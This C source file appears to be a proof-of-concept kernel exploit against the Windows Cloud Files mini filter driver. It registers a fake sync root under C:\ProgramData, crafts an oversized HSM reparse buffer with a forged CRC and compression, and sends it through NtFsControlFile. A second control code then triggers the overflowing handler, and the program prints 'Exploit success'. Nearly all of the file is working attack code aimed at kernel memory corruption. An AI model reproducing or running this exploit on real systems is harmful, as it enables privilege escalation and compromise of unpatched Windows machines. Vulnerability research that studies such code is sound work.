#include "hsm.h"
#include "def.h"
#include<cfapi.h>
#include<stdio.h>


#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "cldapi.lib")


HMODULE ntdll = NULL;
_RtlGetCompressionWorkSpaceSize fnRtlGetCompressionWorkSpaceSize = NULL;
_RtlCompressBuffer fnRtlCompressBuffer = NULL;
_NtFsControlFile fnNtFsControlFile = NULL;



void GetFuncAddr() {
	ntdll = LoadLibraryW(L"ntdll.dll");
	if (!ntdll) {
		printf("[-] Load ntdll error: %d\n", GetLastError());
		exit(-1);
	}
	fnRtlGetCompressionWorkSpaceSize = (_RtlGetCompressionWorkSpaceSize)GetProcAddress(
		ntdll, "RtlGetCompressionWorkSpaceSize");
	fnRtlCompressBuffer = (_RtlCompressBuffer)GetProcAddress(ntdll, "RtlCompressBuffer");
	fnNtFsControlFile = (_NtFsControlFile)GetProcAddress(ntdll, "NtFsControlFile");

}


static void CRC32TableCreate(void)
{
	unsigned int c;
	unsigned int i, j;

	for (i = 0; i < 256; i++) {
		c = (unsigned int)i;
		for (j = 0; j < 8; j++) {
			if (c & 1)
				c = 0xedb88320L ^ (c >> 1);
			else
				c = c >> 1;
		}
		CRC32Table[i] = c;
	}
}


static unsigned int CRC32(void* pBuf, unsigned pBufSize)
{
	unsigned int retCRCValue = 0xffffffff;
	unsigned char* pData;
	pData = (unsigned char*)pBuf;
	while (pBufSize--)
	{
		retCRCValue = CRC32Table[(retCRCValue ^ *pData++) & 0xFF] ^ (retCRCValue >> 8);
	}
	return retCRCValue ^ 0xffffffff;
}


PREPARSE_DATA_BUFFER BuildReparseData(int overflow_size) {

	ULONG work_space_size;
	ULONG work_space_size2;
	ULONG compress_size = 0;
	HLOCAL work_handle;
	HLOCAL work_handle_2;

	size_t final_size = 0x4008 + overflow_size;


	PREPARSE_DATA_BUFFER reparse_data_buffer = (PREPARSE_DATA_BUFFER)calloc(1, final_size);
	if (reparse_data_buffer == nullptr) {
		return NULL;
	}

	memset((void*)reparse_data_buffer, 0, final_size);
	// 0x3f9c + 0x74 = 0x4010
	memset((char*)reparse_data_buffer + 0x74 + 0x8, 'A', final_size - 0x74 - 0x8);
	reparse_data_buffer->ReparseTag = 0x9000301A;
	reparse_data_buffer->ReparseDataLength = final_size - 0x8;
	// reparse_data_buffer
	reparse_data_buffer->hsm_reparse_data.Flags = 0x1;
	reparse_data_buffer->hsm_reparse_data.Length = final_size - 0x8;
	reparse_data_buffer->hsm_reparse_data.FileData.Magic = HSM_FILE_MAGIC;
	reparse_data_buffer->hsm_reparse_data.FileData.Crc32 = 0;
	reparse_data_buffer->hsm_reparse_data.FileData.Length = final_size - 0x8 - 0x4;
	reparse_data_buffer->hsm_reparse_data.FileData.Flags = HSM_DATA_HAVE_CRC;
	reparse_data_buffer->hsm_reparse_data.FileData.NumberOfElements = 0xB;
	reparse_data_buffer->hsm_reparse_data.FileData.ElementInfos[0].Type = HSM_ELEMENT_TYPE_BYTE;
	reparse_data_buffer->hsm_reparse_data.FileData.ElementInfos[0].Length = 1;
	reparse_data_buffer->hsm_reparse_data.FileData.ElementInfos[0].Offset = 0x68;
	*(DWORD*)((char*)reparse_data_buffer + 0x68 + 12) = 1;

	reparse_data_buffer->hsm_reparse_data.FileData.ElementInfos[1].Type = HSM_ELEMENT_TYPE_UINT32;
	reparse_data_buffer->hsm_reparse_data.FileData.ElementInfos[1].Length = 4;
	reparse_data_buffer->hsm_reparse_data.FileData.ElementInfos[1].Offset = 0x6c;
	*(DWORD*)((char*)reparse_data_buffer + 0x68 + 12 + 4) = 62;


	reparse_data_buffer->hsm_reparse_data.FileData.ElementInfos[0xA].Type = HSM_ELEMENT_TYPE_NONE;
	reparse_data_buffer->hsm_reparse_data.FileData.ElementInfos[0xA].Length = final_size - 0x8 - 0x4 - 0x70;
	int last_ele_length = reparse_data_buffer->ReparseDataLength - 0x74;
	reparse_data_buffer->hsm_reparse_data.FileData.ElementInfos[0xA].Offset = 0x70;
	*(QWORD*)((char*)reparse_data_buffer + 0x68 + 12 + last_ele_length) = 0x000007FFAAAAFFFF;

	// _HSM_DATA.Length 偏移
	int fill_size = 0x14;
	int crc_length = final_size - fill_size;
	unsigned int crc = CRC32((void*)(&reparse_data_buffer->hsm_reparse_data.FileData.Length), crc_length);
	printf("[*] Reparse Data Buffer crc32: 0x%x\n", crc);
	reparse_data_buffer->hsm_reparse_data.FileData.Crc32 = crc;
	int length = reparse_data_buffer->ReparseDataLength + 8;

	// 大于0x4000需要压缩
	if (length > 0x4000) {
		// 添加压缩标志
		reparse_data_buffer->hsm_reparse_data.Flags |= 0x8000;
		if (fnRtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &work_space_size, &work_space_size2) < 0)
		{
			work_handle_2 = (HLOCAL)work_space_size2;
		}
		else
		{
			work_handle = LocalAlloc(0x40, work_space_size);
			work_handle_2 = LocalAlloc(0x40, reparse_data_buffer->hsm_reparse_data.FileData.Length);
			if (work_handle == NULL || work_handle_2 == NULL) {
				return NULL;
			}
			if (fnRtlCompressBuffer(COMPRESSION_FORMAT_LZNT1, (PUCHAR)&reparse_data_buffer->hsm_reparse_data.FileData, reparse_data_buffer->hsm_reparse_data.FileData.Length, (PUCHAR)work_handle_2, reparse_data_buffer->hsm_reparse_data.FileData.Length, 0x1000, &compress_size, work_handle) < 0) {
				LocalFree(work_handle_2);
				LocalFree(work_handle);
				printf("[-] fnRtlCompressBuffer failed with %d\n", GetLastError());
				exit(-1);
			}

			LocalFree(work_handle);
		}
		reparse_data_buffer->ReparseDataLength = compress_size + 4;
		memcpy(&reparse_data_buffer->hsm_reparse_data.FileData, work_handle_2, compress_size);
		LocalFree(work_handle_2);
		if (reparse_data_buffer->ReparseDataLength + 2 + 8 > 0x4000)
		{

			exit(1);
		}

	}

	return reparse_data_buffer;
}

int main() {
	struct _OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	GUID guid = { 0 };
	WCHAR* dir = (WCHAR*)L"C:\\ProgramData";
	HANDLE hObject = NULL;
	struct _IO_STATUS_BLOCK IoStatusBlock;
	struct _IO_STATUS_BLOCK IoStatusBlock_control_file;



	guid.Data1 = 0xB196E670;
	guid.Data2 = 0x59C7;
	guid.Data3 = 0x4D41;

	CRC32TableCreate();
	GetFuncAddr();

	CfUnregisterSyncRoot(L"C:\\ProgramData\\");

	CF_SYNC_REGISTRATION reg = { 0 };
	reg.StructSize = sizeof(reg);
	reg.ProviderName = L"test";
	reg.ProviderVersion = L"1.0";
	reg.ProviderId = guid;

	CF_SYNC_POLICIES policies = { 0 };
	policies.StructSize = sizeof(policies);
	policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
	policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
	policies.InSync = CF_INSYNC_POLICY_NONE;
	policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

	HRESULT hr = CfRegisterSyncRoot(dir, &reg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
	if (FAILED(hr)) {
		printf("[-] CfRegisterSyncRoot failed with %d", GetLastError());
		return 0;
	}

	printf("[*] CfRegisterSyncRoot success\n");

	ObjectAttributes.RootDirectory = NULL;
	ObjectAttributes.SecurityDescriptor = NULL;

	UNICODE_STRING objdir;
	RtlInitUnicodeString(&objdir, L"\\??\\C:\\ProgramData\\");
	InitializeObjectAttributes(&ObjectAttributes, &objdir, 0, 0, 0);
	ObjectAttributes.Attributes = 64;
	NtCreateFile(&hObject, GENERIC_READ | GENERIC_WRITE, &ObjectAttributes, &IoStatusBlock, 0, 0, 1, 3, 1, 0, 0);


	PREPARSE_DATA_BUFFER reparse_data = BuildReparseData(0x100);

	// 申请足够大的空间
	int control_buffer_length = reparse_data->ReparseDataLength + 40;
	unsigned int* control_buffer = (unsigned int*)calloc(1, control_buffer_length);
	*control_buffer = 0;
	control_buffer[1] = 0x9000301A;
	memcpy(control_buffer + 8, reparse_data, reparse_data->ReparseDataLength + 8);
	fnNtFsControlFile(
		hObject,
		0,
		0,
		0,
		&IoStatusBlock_control_file,
		FSCTL_SET_REPARSE_POINT_EX,
		control_buffer,
		control_buffer_length,
		0,
		0);

	printf("[*] fnNtFsControlFile with FSCTL_SET_REPARSE_POINT_EX \n");

	unsigned int* control_buffer_2 = (unsigned int*)calloc(1, 0x100);
	*control_buffer_2 = 0x9000001A;
	control_buffer_2[1] = 0xC0000003;
	control_buffer_2[2] = 0x10000;

	fnNtFsControlFile(
		hObject,
		0,
		0,
		0,
		&IoStatusBlock_control_file,
		0x903BC,
		control_buffer_2,
		0x100,
		0,
		0);
	printf("[*] second tigger HsmFltProcessHSMControl func \n");
	free(control_buffer_2);
	CloseHandle(hObject);

	hr = CfUnregisterSyncRoot(L"C:\\ProgramData\\");
	if (hr < 0)
		printf("[-] CfUnregisterSyncRoot failed with 0x%x\n", GetLastError());

	printf("[*] Exploit success\n");
	free(reparse_data);
	return 0;
}
